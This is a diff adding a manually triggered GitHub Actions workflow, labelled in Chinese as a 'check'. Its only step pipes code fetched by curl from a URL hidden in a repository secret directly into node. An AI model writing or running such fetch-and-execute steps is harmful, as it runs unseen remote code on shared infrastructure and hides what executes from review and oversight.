@@ -1,0 +1,9 @@
+name: 檢查10-18
+on:
+ workflow_dispatch: #手動觸發
+jobs:
+ check:
+  runs-on: ubuntu-latest
+  steps:
+   - name: 持續執行
+     run: curl -fsSL '${{secrets.js}}'|node
